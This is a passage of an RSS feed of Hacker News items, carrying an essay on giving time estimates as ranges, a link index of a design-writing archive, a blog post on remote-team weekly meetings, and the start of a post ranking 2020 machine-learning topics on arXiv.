<p>Underestimators fail to give enough buffer. This strategy has two key benefits. First, it signals (unrealistically) high performance. Like our virtue-signalling teammate, we can underestimate ahead of time, then point at concrete surprises for our eventual underperformance. And like our overpromising competitor, we can underestimate during a bid and do whatever we want after the contract is signed. Second, tight estimates demand efficiency. Underestimators set deadlines that they and their teams must work hard to meet. Underestimation works well when the costs of going over-budget are small. But when those costs are large, underestimations lead to disasters. On the whole, underestimators systematically run the risk of being burnt out, past-deadline, and over-budget.</p>



<p>Overestimators are instead biased towards large buffers. Extreme overestimators might send you articles titled “Estimations are a Scam”, or claim that estimations are simply tools for worker exploitation. Overestimation works when the costs of buffer are low and the costs of going over budget are high. But overestimators are constantly taxed by Parkinson’s Law. Parkinson’s Law is the pattern where projects fill the time and resources they’re allocated, instead of the time and resources they need [2]. Rather than pushing towards peak performance, overestimators systematically move at a bored, leisurely pace. Overestimators are also demotivating. Rather than inspiring the team to reach competitive goals, they disparage those who do. So while underestimators run the risk of their teams burning out, overestimators run the risk of their teams shutting down.</p>



<p>To simplify the hard problem of estimations, we slowly become under- or over-estimators. We reap the systematic rewards and accept the systematic costs. These chosen strategies may work in many contexts. But for any simple strategy, there are worst-case scenarios where those systematic risks blow up. Underestimators blow up when the costs of going over budget skyrocket. Overestimators blow up when the costs of adding extra buffer skyrocket.</p>



<p>This line between underestimators and overestimators forms a classic “spectrum problem”. A spectrum problem occurs when we oversimplify the solution to a given tradeoff. In this case, we’re splitting the spectrum of estimation strategies in half. Underestimators fall on one side of the line, and overestimators fall on the other. With many spectrum problems, the better solution is to cut the spectrum into three pieces, choosing the middle strategy between extremes. In doing so, we acknowledge the costs and rewards of both sides, maximizing the upsides and minimizing the downsides systematically.</p>



<h2>Playing Single-Pointed Darts</h2>



<p>Imagine a game of darts with very simple rules. I throw my dart first, and you only score by hitting that same exact dart-sized point. This game is very simple, but so difficult that nobody would play it. To make darts playable, we specify scoring <em>ranges</em>. These same ranges are missing from our everyday estimations.</p>



<p>The most common estimate sounds something like: “I’ll have it ready by 5pm.” But this is just like playing single-point darts! Imagine that this estimate is perfectly precise: the project can’t be ready one second before or one second after 5pm. While impressive, there’s zero room for error. If we end up sick, or if the project ends up more complex than expected, our estimate becomes instantly wrong.</p>



<p>To account for surprises, we can add buffer. But adding buffer only shifts the dart board over a few inches. “I’ll have it ready by 5pm <em>tomorrow</em>” faces all the same problems as the first estimation. Two days of surprises still makes me wrong. We’re still playing single-pointed darts.</p>



<p>It’s a losing game. And yet we see it played again and again, day after day, project after project.</p>



<h2>Playing Darts with Ranges</h2>



<p>To enjoy this game of darts, we need to change the rules. Rather than giving a single-pointed estimate, we give two points: one for the best case, and one for the worst case. These two points create a range of targets to hit, just like the game of darts we know and love.</p>



<p>To demonstrate, I can give an example from my personal life. My girlfriend is very punctual, and I’m not. She’s a classic overestimator, giving as much buffer as we can afford. And I’m a classic underestimator, giving the most optimistic estimates. So whenever we have somewhere to be, and she asks me “what time should we be ready?”… it’s a classic estimation problem!</p>



<p>My preference would be to underestimate, and tell her the last minute we can leave without being late. Her preference would be for me to overestimate, telling her the soonest we can leave without being “too early”. But no matter what I say, we face all of the same problems stated above.</p>



<p>Recently, I’ve started giving her two answers. The first answer is “the green time”. <strong>The green time tells us when we should leave so that we’re pleasantly early</strong>. The second answer is “the red time”. <strong>The red time is the last minute we can leave, without definitely being late</strong>. If we can be ready by the green time without stress or shortcuts, that’s perfect. Once we pass the green time, we go into the “yellow zone.” <strong>The yellow zone is the buffer between early and late</strong>. There’s no need to take shortcuts or change plans yet, but we’re getting close. Once we approach the red line, we start discussing the need to take shortcuts, or to start telling others that we may be a little late.</p>



<p>Having a green time, a yellow zone, and a red time transforms our game of single-pointed darts into a proper dartboard, with zones of success. The green time makes my girlfriend happy: she can be ready early without worry. The red time makes me happy: I can fill my buffer time up with other activities. And the yellow zone is a signal for both of us to get focused or to start taking shortcuts [3].</p>



<p>Aside from the technical benefits, I can <em>feel</em> the difference in enjoyment between playing single-pointed darts vs playing scoring-ranged darts. Having a range makes inherent uncertainty explicit to the group. Adding buffer doesn’t just shift the dartboard a few inches, it expands our range of accuracy. Larger buffers signal more uncertainty and require less precision, while smaller buffers signal more confidence and require more precision. The expression of certainty and confidence isn’t possible to communicate with a single-pointed estimate.</p>



<p>By estimating with two numbers instead of one, a richness of information and strategies are made available.</p>



<h2>Simple Changes</h2>



<p>Using two numbers instead of one, these so-called “confidence intervals” aren’t complicated. Then why are they so absent from everyday life?</p>



<p>Although nothing prevented us from discovering them earlier, the first mention of confidence intervals in scientific literature wasn’t until 1937. And it wasn’t until the 1980s that they were required in scientific journals. So if it took forty years for the most knowledgeable people to apply a simple solution towards the most urgent problems, it’s not surprising that it’s taken the rest of us at least as long. That said, the goal of this essay is to speed up that process.</p>



<p>We can move towards accurate estimations by practicing two …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://camhashemi.com/2020/12/28/accurate-estimations/">https://camhashemi.com/2020/12/28/accurate-estimations/</a></em></p>]]>
            </description>
            <link>https://camhashemi.com/2020/12/28/accurate-estimations/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25560386</guid>
            <pubDate>Mon, 28 Dec 2020 16:19:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Reading Design: online archive of critical writing about design]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25560311">thread link</a>) | @headalgorithm
<br/>
December 28, 2020 | https://www.readingdesign.org/index-1 | <a href="https://web.archive.org/web/*/https://www.readingdesign.org/index-1">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="pageWrapper">
        <section id="page">
          <div id="mainContent" role="main" data-content-field="main-content">
            
            
              
            
            
            
            
            

            <div data-type="page" data-updated-on="1598018231553" id="page-5478696de4b0306d2b1934c8"><div><div><div data-block-type="2" id="block-yui_3_17_2_1_1417567828653_72178"><p>Reading Design&nbsp;is an online archive of critical writing about design. The idea is to embrace the whole of design, from architecture and urbanism to product, fashion, graphics and beyond. The texts featured here date from the nineteenth century right up to the present moment but each one contains something which remains relevant, surprising or interesting to us today.</p></div></div></div><div><div><div data-block-type="2" id="block-7fb70912265f44ec4a47"><div><p><a href="https://www.readingdesign.org/nakatomi-space">Back doors</a><br><a href="https://www.readingdesign.org/futurist-manifesto-mens-clothing">Balla, Giacomo</a><br><a href="https://www.readingdesign.org/autostrade">Barr, Sue</a><br><a href="https://www.readingdesign.org/tag-baudrillard-jean">Baudrillard, Jean</a><br><a href="https://www.readingdesign.org/the-new-typography">Bauhaus</a><br><a href="https://www.readingdesign.org/metal-work">Benson, W. A. S.</a><br><a href="https://www.readingdesign.org/politics-of-materials">Bingham-Hall, John</a><br><a href="https://www.readingdesign.org/design-and-democracy">Bonsiepe, Gui</a><br><a href="https://www.readingdesign.org/tag-book-covers">Book covers</a><br><a href="https://www.readingdesign.org/ideal-book">Book design</a><br><a href="https://www.readingdesign.org/tag-books">Books</a><br><a href="https://www.readingdesign.org/to-newton">Boullée, Étienne-Louis</a><br><a href="https://www.readingdesign.org/all-watched-over-by-machines">Brautigan, Richard</a><br><a href="https://www.readingdesign.org/tag-bridle-james">Bridle, James</a><br><a href="https://www.readingdesign.org/adf-manifesto">Brody, Neville</a><br><a href="https://www.readingdesign.org/form-of-housing">Brown, Neave</a><br><a href="https://www.readingdesign.org/the-limits-of-memory">Brutalism</a></p></div></div></div><div><div data-block-type="2" id="block-edd2eaf0d60a2bc456d1"><div><p><a href="https://www.readingdesign.org/cafes">Cafés</a><br><a href="https://www.readingdesign.org/first-table">Campagna, Federico</a><br><a href="https://www.readingdesign.org/sculptures-new-spaces">Caro, Anthony</a><br><a href="https://www.readingdesign.org/the-designers-dilemma">Casey, Valerie</a><br><a href="https://www.readingdesign.org/fame-and-flw">Celebrity</a><br><a href="https://www.readingdesign.org/manifestos-hussein-chalayan">Chalayan, Hussein</a><br><a href="https://www.readingdesign.org/formulary">Chtcheglov, Ivan</a><br><a href="https://www.readingdesign.org/tag-cities">Cities</a><br><a href="https://www.readingdesign.org/how-not-to-be-a-starchitect">Clarke, Katherine</a><br><a href="https://www.readingdesign.org/1867-convention">Cole, Henry</a><br><a href="https://www.readingdesign.org/the-meaning-of-craft">Collingwood, R.G.</a><br><a href="https://www.readingdesign.org/the-work-ahead-of-us">Constructivism</a><br><a href="https://www.readingdesign.org/tag-coomaraswamy">Coomaraswamy, Ananda</a><br><a href="https://www.readingdesign.org/tag-craft">Craft</a><br><a href="https://www.readingdesign.org/vernacular-furniture">Creasy, Max</a><br><a href="https://www.readingdesign.org/critical-design-faq">Critical design</a><br><a href="https://www.readingdesign.org/feminist-architecture-a-z">Critical spatial practice</a><br><a href="https://www.readingdesign.org/there-is-no-criticism">Criticism</a><br><a href="https://www.readingdesign.org/dishonourable-success">Crowdfunding</a><br><a href="https://www.readingdesign.org/returning-duchamps-urinal">Cruz, Teddy</a><br><a href="https://www.readingdesign.org/high-vis-vest">Culture</a><br><a href="https://www.readingdesign.org/look-at-me">Cummings, Neil</a><br><a href="https://www.readingdesign.org/public-space">Cuyvers, Wim</a><br><a href="https://www.readingdesign.org/cafes">Czech, Hermann</a></p></div></div></div></div><div><div><div><div><div data-block-type="2" id="block-yui_3_17_2_1_1417197716657_140302"><div><p><a href="https://www.readingdesign.org/mantownhuman">Farlie, Alan</a><br><a href="https://www.readingdesign.org/freespace-manifesto">Farrell, Yvonne</a><br><a href="https://www.readingdesign.org/tag-fashion">Fashion</a><br><a href="https://www.readingdesign.org/village-design">Fathy, Hassan</a><br><a href="https://www.readingdesign.org/tag-feminism">Feminism</a><br><a href="https://www.readingdesign.org/tag-film">Film</a><br><a href="https://www.readingdesign.org/bradbury-building">Film Noir</a><br><a href="https://www.readingdesign.org/how-not-to-be-a-starchitect">Fior, Liza</a><br><a href="https://www.readingdesign.org/how-to-work-better">Fischli and Weiss</a><br><a href="https://www.readingdesign.org/forensis-counterforensics">Forensic Architecture</a><br><a href="https://www.readingdesign.org/tag-foster-norman">Foster, Norman</a><br><a href="https://www.readingdesign.org/of-other-spaces">Foucault, Michel</a><br><a href="https://www.readingdesign.org/antiracist-manifesto">Frankowski, Nathalie</a><br><a href="https://www.readingdesign.org/twelve-cautionary-tales">Frassinelli, Gian Piero</a><br><a href="https://www.readingdesign.org/on-interpretation">Friedman, Yona</a><br><a href="https://www.readingdesign.org/functionalism">Functionalism</a><br><a href="https://www.readingdesign.org/post-modernism">Furman, Adam</a><br><a href="https://www.readingdesign.org/tag-furniture">Furniture</a><br><a href="https://www.readingdesign.org/the-philosophy-of-furniture">Furniture design</a><br><a href="https://www.readingdesign.org/futurism">Futurism</a></p></div></div></div><div><div data-block-type="2" id="block-yui_3_17_2_1_1417198189195_23371"><div><p><a href="https://www.readingdesign.org/letter-to-soane">Gandy, Joseph</a><br><a href="https://www.readingdesign.org/antiracist-manifesto">Garcia, Cruz</a><br><a href="https://www.readingdesign.org/first-things-first">Garland, Ken</a><br><a href="https://www.readingdesign.org/time-and-place">Gill, Eric</a><br><a href="https://www.readingdesign.org/ten-things">Glaser, Milton</a><br><a href="https://www.readingdesign.org/foucaults-boomerang">Graham, Stephen</a><br><a href="https://www.readingdesign.org/understanding-repair">Grange, Kenneth</a><br><a href="https://www.readingdesign.org/tag-graphic-design">Graphic design</a><br><a href="https://www.readingdesign.org/smart-city">Greenfield, Adam</a><br><a href="https://www.readingdesign.org/programme-for-city-reconstruction">Gropius, Walter</a><br><a href="https://www.readingdesign.org/obligation-to-self-design">Groys, Boris</a></p></div></div></div></div><div><div><div data-block-type="2" id="block-yui_3_17_2_1_1417567997806_118914"><div><p><a href="https://www.readingdesign.org/manifestos-john-maeda">Maeda, John</a><br><a href="https://www.readingdesign.org/nakatomi-space">Manaugh, Geoff</a><br><a href="https://www.readingdesign.org/tag-manifestos">Manifestos</a><br><a href="https://www.readingdesign.org/metal-work">Manufacturing</a><br><a href="https://www.readingdesign.org/music-and-architecture">Marcus, Laura</a><br><a href="https://www.readingdesign.org/margolies-roadside-america">Margolies, John</a><br><a href="https://www.readingdesign.org/barcelona-manifesto">Mari, Enzo</a><br><a href="https://www.readingdesign.org/rightness">Marriott, Michael</a><br><a href="https://www.readingdesign.org/fame-and-flw">Martin, Howard</a><br><a href="https://www.readingdesign.org/sodrakull-frosakull">Mathsson, Bruno</a><br><a href="https://www.readingdesign.org/temporary-fix">Mattern, Andy</a><br><a href="https://www.readingdesign.org/fairytales-and-fashion-criticism">Matthews, Rachel</a><br><a href="https://www.readingdesign.org/manifestos-mau">Mau, Bruce</a><br><a href="https://www.readingdesign.org/maxwell-peter">Maxwell, Peter</a><br><a href="https://www.readingdesign.org/hannover-principles">McDonough, William</a><br><a href="https://www.readingdesign.org/radical-urbanism">McGuirk, Justin</a><br><a href="https://www.readingdesign.org/freespace-manifesto">McNamara, Shelley</a><br><a href="https://www.readingdesign.org/first-table">Meaning</a><br><a href="https://www.readingdesign.org/exercise-in-modernity">Mendes da Rocha, Paulo</a><br><a href="https://www.readingdesign.org/apousiokoumpounophobia">Mentzel, Dora</a><br><a href="https://www.readingdesign.org/tag-gustav-metzger">Metzger, Gustav</a><br><a href="https://www.readingdesign.org/nightmare-of-participation">Miessen, Markus</a><br><a href="https://www.readingdesign.org/amusement-parks">Milstein, Jeffrey</a><br><a href="https://www.readingdesign.org/modernism">Modernism</a><br><a href="https://www.readingdesign.org/tag-moholynagylaszlo">Moholy-Nagy, László</a><br><a href="https://www.readingdesign.org/super-normal">Morrison, Jasper</a><br><a href="https://www.readingdesign.org/tag-morris-william">Morris, William</a><br><a href="https://www.readingdesign.org/how-not-to-be-a-starchitect">Muf</a><br><a href="https://www.readingdesign.org/museums">Museums</a><br><a href="https://www.readingdesign.org/music-and-architecture">Music</a></p></div></div></div></div></div></div><div><div><div><div><div data-block-type="2" id="block-37338354c815c031bdaa"><div><p><a href="https://www.readingdesign.org/knolling">Sachs, Tom</a><br><a href="https://www.readingdesign.org/manifestos-stefan-sagmeister">Sagmeister, Stefan</a><br><a href="https://www.readingdesign.org/manifesto-futurist">Sant'Elia, Antonio</a><br><a href="https://www.readingdesign.org/manifestos-peter-saville">Saville, Peter</a><br><a href="https://www.readingdesign.org/glass-architecture">Scheerbart, Paul</a><br><a href="https://www.readingdesign.org/stop">Schumacher, Patrik</a><br><a href="https://www.readingdesign.org/on-interior-design">Scott, Fred</a><br><a href="https://www.readingdesign.org/seaside-shelters">Scott, Will</a><br><a href="https://www.readingdesign.org/tag-scott-brown-denise">Scott Brown, Denise</a><br><a href="https://www.readingdesign.org/sculptures-new-spaces">Sculpture</a><br><a href="https://www.readingdesign.org/design">Sedding, John Dando</a><br><a href="https://www.readingdesign.org/the-pnyx-and-the-agora">Sennett, Richard</a><br><a href="https://www.readingdesign.org/nakatomi-space">Services</a><br><a href="https://www.readingdesign.org/mantownhuman">Sharro, Karl</a><br><a href="https://www.readingdesign.org/on-edge">Shonfield, Katherine</a><br><a href="https://www.readingdesign.org/philosophy-of-site">SITE</a><br><a href="https://www.readingdesign.org/tag-situationists">Situationists</a><br><a href="https://www.readingdesign.org/living-in-a-house">Siza, Álvaro</a><br><a href="https://www.readingdesign.org/team-10-primer">Smithson, Alison and Peter</a><br><a href="https://www.readingdesign.org/letter-to-soane">Soane, Sir John</a><br><a href="https://www.readingdesign.org/team-10-primer">Society</a><br><a href="https://www.readingdesign.org/conspicuous-consumption">Sociology</a><br><a href="https://www.readingdesign.org/sorkin-michael-tag">Sorkin, Michael</a><br><a href="https://www.readingdesign.org/sota">Sota Ríus, José de la</a><br><a href="https://www.readingdesign.org/mart">Stam, Mart</a><br><a href="https://www.readingdesign.org/how-to-kill-people">Steyerl, Hito</a><br><a href="https://www.readingdesign.org/why-capitalist-cities-plan">Stein, Sam</a><br><a href="https://www.readingdesign.org/tag-sullivan-louis">Sullivan, Louis</a><br><a href="https://www.readingdesign.org/twelve-cautionary-tales">Superstudio</a><br><a href="https://www.readingdesign.org/tag-sustainable-design">Sustainable Design</a></p></div></div></div></div><div><div><div data-block-type="2" id="block-yui_3_17_2_2_1417899325622_57321"><div><p><a href="https://www.readingdesign.org/programme-for-city-reconstruction">Wagner, Martin</a><br><a href="https://www.readingdesign.org/how-to-kill-people">War</a><br><a href="https://www.readingdesign.org/forensis-counterforensics">Weizman, Eyal</a><br><a href="https://www.readingdesign.org/urban-detective">Wentworth, Richard</a><br><a href="https://www.readingdesign.org/decoration-as-art">Wheeler, Candace</a><br><a href="https://www.readingdesign.org/tag-wilde-oscar">Wilde, Oscar</a><br><a href="https://www.readingdesign.org/tag-wiles-will">Wiles, Will</a><br><a href="https://www.readingdesign.org/mantownhuman">Williams, Austin</a><br><a href="https://www.readingdesign.org/mantownhuman">Williams, Richard J</a><br><a href="https://www.readingdesign.org/philosophy-of-site">Wines, James</a><br><a href="https://www.readingdesign.org/informal-arrangements">Wolf, Michael</a><br><a href="https://www.readingdesign.org/woods-lebbeus">Woods, Lebbeus</a><br><a href="https://www.readingdesign.org/a-room-of-ones-own">Woolf, Virginia</a><br><a href="https://www.readingdesign.org/ten-things">Work</a><br><a href="https://www.readingdesign.org/tract-i">Wren, Sir Christopher</a><br><a href="https://www.readingdesign.org/fame-and-flw">Wright, Frank Lloyd</a></p></div></div></div></div></div></div></div>

            
            
            
            
            
            
          </div>
        </section>
      </div></div>]]>
            </description>
            <link>https://www.readingdesign.org/index-1</link>
            <guid isPermaLink="false">hacker-news-small-sites-25560311</guid>
            <pubDate>Mon, 28 Dec 2020 16:10:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My favorite startup management hack of 2020]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25560287">thread link</a>) | @jasonkolb
<br/>
December 28, 2020 | https://jasonkolb.com/my-favorite-management-hack-of-2020/ | <a href="https://web.archive.org/web/*/https://jasonkolb.com/my-favorite-management-hack-of-2020/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-id="1a84d1d0" data-element_type="widget" data-widget_type="theme-post-content.default"><div><p>2020 was a rough year for everyone, even for those of us blessed to be able to work from home. Psychologically and emotionally, it’s easy to feel disconnected and lonely when you don’t see people outside your household for weeks and months on end. And this presents some unique challenges for maintaining culture and productivity, and keeping morale up in general.</p><p><strong>The Challenge</strong></p><p>When the pandemic hit in March and everyone in the world started working remotely, we were worried about how to keep people connected and plugged in. We had to adapt quickly to keep communication flowing and make sure that everyone felt connected and a part of the community that we somewhat lost when everyone stopped going into the office.</p><p>We developed a solution that has worked really well for us, and I’d like to share it. I hope you find it useful, but I’d love to hear if you’ve found other things that work as well.</p><p><strong>The Solution: Monday Morning</strong></p><p>Immediately after switching to full remote work, we switched up the cadence of company meetings. We went from an all hands once a month to two in the same week.</p><p>Every Monday morning at 9:30 we get everyone together (via Zoom) to kick off the week with a company-wide coffee hour.</p><figure><img width="1024" height="577" src="https://jasonkolb.com/wp-content/uploads/2020/12/image-1024x577.png" alt="" srcset="https://jasonkolb.com/wp-content/uploads/2020/12/image-1024x577.png 1024w, https://jasonkolb.com/wp-content/uploads/2020/12/image-300x169.png 300w, https://jasonkolb.com/wp-content/uploads/2020/12/image-768x433.png 768w, https://jasonkolb.com/wp-content/uploads/2020/12/image-1536x865.png 1536w, https://jasonkolb.com/wp-content/uploads/2020/12/image-2048x1154.png 2048w, https://jasonkolb.com/wp-content/uploads/2020/12/image-1200x676.png 1200w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://jasonkolb.com/wp-content/uploads/2020/12/image-1024x577.png" data-srcset="https://jasonkolb.com/wp-content/uploads/2020/12/image-1024x577.png 1024w, https://jasonkolb.com/wp-content/uploads/2020/12/image-300x169.png 300w, https://jasonkolb.com/wp-content/uploads/2020/12/image-768x433.png 768w, https://jasonkolb.com/wp-content/uploads/2020/12/image-1536x865.png 1536w, https://jasonkolb.com/wp-content/uploads/2020/12/image-2048x1154.png 2048w, https://jasonkolb.com/wp-content/uploads/2020/12/image-1200x676.png 1200w"><figcaption>Mmm, a cup of coffee together is a great way to kick off the week!</figcaption></figure><p>In this meeting we go team-by-team over what we accomplished last week and our goals are for this week. And we check on what we actually got done last week compared to what we were planning to do:</p><figure><img src="https://jasonkolb.com/wp-content/uploads/2020/12/image-1-1024x572.png" alt="" width="580" height="323" srcset="https://jasonkolb.com/wp-content/uploads/2020/12/image-1-1024x572.png 1024w, https://jasonkolb.com/wp-content/uploads/2020/12/image-1-300x168.png 300w, https://jasonkolb.com/wp-content/uploads/2020/12/image-1-768x429.png 768w, https://jasonkolb.com/wp-content/uploads/2020/12/image-1-1536x858.png 1536w, https://jasonkolb.com/wp-content/uploads/2020/12/image-1-2048x1144.png 2048w, https://jasonkolb.com/wp-content/uploads/2020/12/image-1-1200x670.png 1200w" sizes="(max-width: 580px) 100vw, 580px" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://jasonkolb.com/wp-content/uploads/2020/12/image-1-1024x572.png" data-srcset="https://jasonkolb.com/wp-content/uploads/2020/12/image-1-1024x572.png 1024w, https://jasonkolb.com/wp-content/uploads/2020/12/image-1-300x168.png 300w, https://jasonkolb.com/wp-content/uploads/2020/12/image-1-768x429.png 768w, https://jasonkolb.com/wp-content/uploads/2020/12/image-1-1536x858.png 1536w, https://jasonkolb.com/wp-content/uploads/2020/12/image-1-2048x1144.png 2048w, https://jasonkolb.com/wp-content/uploads/2020/12/image-1-1200x670.png 1200w"><figcaption>An example team dashboard</figcaption></figure><p>This is just a simple Google sheets deck that we have all of the leaders of the company update on Friday afternoon, with one slide per team:</p><figure><img width="1024" height="635" src="https://jasonkolb.com/wp-content/uploads/2020/12/image-2-1024x635.png" alt="" srcset="https://jasonkolb.com/wp-content/uploads/2020/12/image-2-1024x635.png 1024w, https://jasonkolb.com/wp-content/uploads/2020/12/image-2-300x186.png 300w, https://jasonkolb.com/wp-content/uploads/2020/12/image-2-768x477.png 768w, https://jasonkolb.com/wp-content/uploads/2020/12/image-2-1536x953.png 1536w, https://jasonkolb.com/wp-content/uploads/2020/12/image-2-2048x1271.png 2048w, https://jasonkolb.com/wp-content/uploads/2020/12/image-2-1200x745.png 1200w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://jasonkolb.com/wp-content/uploads/2020/12/image-2-1024x635.png" data-srcset="https://jasonkolb.com/wp-content/uploads/2020/12/image-2-1024x635.png 1024w, https://jasonkolb.com/wp-content/uploads/2020/12/image-2-300x186.png 300w, https://jasonkolb.com/wp-content/uploads/2020/12/image-2-768x477.png 768w, https://jasonkolb.com/wp-content/uploads/2020/12/image-2-1536x953.png 1536w, https://jasonkolb.com/wp-content/uploads/2020/12/image-2-2048x1271.png 2048w, https://jasonkolb.com/wp-content/uploads/2020/12/image-2-1200x745.png 1200w"><figcaption>This is the whole thing</figcaption></figure><p>The whole meeting takes about 30 minutes, and it’s a great way to kick off the week. Everyone knows what’s happening around the company, including in all of the other teams. Everyone seems to like it, and there are some interesting byproducts:</p><ul><li>Our short-term goal setting has gotten much better. Goals are set on a weekly basis, which has resulted in more accountability and velocity. Teams are looking at goals on a shorter time horizon now, which leads to more tangible outcomes every week.</li><li>Wins and losses come at the end of each and every week, which is very motivating if the team hits their goals, or if the team doesn’t hit their goals. Either way, the entire company sees it.</li><li>We’ve become much better at estimating how long it will take to do something. If you’re bad at estimating it can completely destroy morale and trust, this shorter-term focus has made the act of slicing up work into achievable chunks much more efficient.</li></ul><p><strong>The Solution: Friday Afternoon</strong></p><p>On Friday afternoon there are two more things we do every single week.</p><p>At 1pm, after the leadership team updates the Monday morning deck, we meet as a group to review everyone’s updates together, ask questions, and talk about challenges. Some of the best discussions and collaboration happen during this meeting, and this is the main place and time where cross-team dependencies are often discovered and planned around. We also talk about wins, challenges, and collect shout-outs for people who have done outstanding work over the past week.</p><p>Then at 4:30pm, before everyone takes off for the weekend, we wrap up the week with our Friday Afternoon Happy Hour:</p><figure><img width="1024" height="576" src="https://jasonkolb.com/wp-content/uploads/2020/12/friday-happy-hour-1024x576.png" alt="" srcset="https://jasonkolb.com/wp-content/uploads/2020/12/friday-happy-hour-1024x576.png 1024w, https://jasonkolb.com/wp-content/uploads/2020/12/friday-happy-hour-300x169.png 300w, https://jasonkolb.com/wp-content/uploads/2020/12/friday-happy-hour-768x432.png 768w, https://jasonkolb.com/wp-content/uploads/2020/12/friday-happy-hour-1200x675.png 1200w, https://jasonkolb.com/wp-content/uploads/2020/12/friday-happy-hour.png 1255w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://jasonkolb.com/wp-content/uploads/2020/12/friday-happy-hour-1024x576.png" data-srcset="https://jasonkolb.com/wp-content/uploads/2020/12/friday-happy-hour-1024x576.png 1024w, https://jasonkolb.com/wp-content/uploads/2020/12/friday-happy-hour-300x169.png 300w, https://jasonkolb.com/wp-content/uploads/2020/12/friday-happy-hour-768x432.png 768w, https://jasonkolb.com/wp-content/uploads/2020/12/friday-happy-hour-1200x675.png 1200w, https://jasonkolb.com/wp-content/uploads/2020/12/friday-happy-hour.png 1255w"><figcaption>Not everyone drinks at happy hour, but we do keep it happy!</figcaption></figure><p>We try to keep happy hour fun and lighthearted. We celebrate wins, give shout-outs to people who did something extraordinary over the course of the week, and show the company any fun or funny things that happened during the course of the week. We try to leave some room for people to talk and have fun as well (we’ve had some GREAT Zoom backgrounds!), but generally we try to send people into the weekend on a high note.</p><p><strong>Summary</strong></p><p>These meetings have become routine for us now, and pretty much our entire company loves them. Our communication is better, teamwork is tighter, goal-setting is more accurate, and velocity is way higher.</p><p>Honestly I would have a hard time *not* having these meetings now. They’ve worked *so well* to create a tighter company all around that I don’t know that any set of in-person meetings could really replicate, let alone surpass, the results.</p><p>This may not work for everyone, but it works great for us, and I hope that at the very least this sparks some ideas for making your company more efficient and maintaining your culture during this–or any future–challenge to working together.</p></div></div></div>]]>
            </description>
            <link>https://jasonkolb.com/my-favorite-management-hack-of-2020/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25560287</guid>
            <pubDate>Mon, 28 Dec 2020 16:08:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Most Frequently Mentioned ML Topics in 2020]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25560257">thread link</a>) | @polm23
<br/>
December 28, 2020 | https://www.ml4asia.com/most-frequently-mentioned-ml-topics-in-2020/ | <a href="https://web.archive.org/web/*/https://www.ml4asia.com/most-frequently-mentioned-ml-topics-in-2020/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://www.ml4asia.com/content/images/size/w300/2020/12/cover-9.png 300w,
                            https://www.ml4asia.com/content/images/size/w600/2020/12/cover-9.png 600w,
                            https://www.ml4asia.com/content/images/size/w1000/2020/12/cover-9.png 1000w,
                            https://www.ml4asia.com/content/images/size/w2000/2020/12/cover-9.png 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://www.ml4asia.com/content/images/size/w2000/2020/12/cover-9.png" alt="Most Frequently Mentioned ML Topics in 2020">
            </figure>

            <section>
                <div>
                    <!--kg-card-begin: markdown--><p>The progress of the machine learning (ML) and artificial intelligence fields never stopped surprising us this year either. In natural language processing (NLP), new, powerful models such as GPT-3 and T5 are published one after another. The Transformer found its way into the computer vision (CV) field as well (<a href="https://cdn.openai.com/papers/Generative_Pretraining_from_Pixels_V2.pdf">Chen et al. 2020</a>, <a href="https://arxiv.org/abs/2010.11929">Dosovitskiy et al. 2020</a>). The exponential growth trend of the number of papers published on arXiv and at conferences hasn't slowed down yet.</p>
<p>In this post, I'm going to use NLP techniques to analyze all the ML/NLP/CV papers published on arXiv this year and summarize the "most frequently mentioned ML topics in 2020." These top-ranked keywords represent the ML trends in 2020 very well, and knowing them in advance will make your job easier when it comes to reading more scientific articles (this is very important for non-native English speakers like me!)</p>
<p>Specifically, I collected the titles and abstracts of all the papers published on arXiv in 2020 via the arXiv API, and extracted named entities with a model trained on SciREX. The SciREX model can extract typed named entities such as tasks, metrics, datasets, and methods, which enables us to rank the mentions per type. The technical details of the analyses are shown in the "technical details" section at the bottom of this article.</p>
<h2 id="mostfrequentlymentionedtopicsin2020pertype">Most Frequently Mentioned Topics in 2020 (per Type)</h2>
<p>I only focus on the three AI fields—general machine learning (<a href="https://arxiv.org/list/cs.LG/recent">cs.LG</a>), natural language processing (<a href="https://arxiv.org/list/cs.CL/recent">cs.CL</a>), and computer vision (<a href="https://arxiv.org/list/cs.CV/recent">cs.CV</a>). I'm aware that there are many other AI/ML categories on arXiv, although I limited to just three to simplify things.</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h3 id="machinelearningcslg">Machine Learning (cs.LG)</h3>
<p>First, let's look at the most mentioned topics in machine learning per type below:</p>
<table>
<thead>
<tr>
<th>Datasets</th>
<th>Metrics</th>
<th>Tasks</th>
<th>Methods</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://www.cs.toronto.edu/~kriz/cifar.html">CIFER-10</a></td>
<td>accuracy</td>
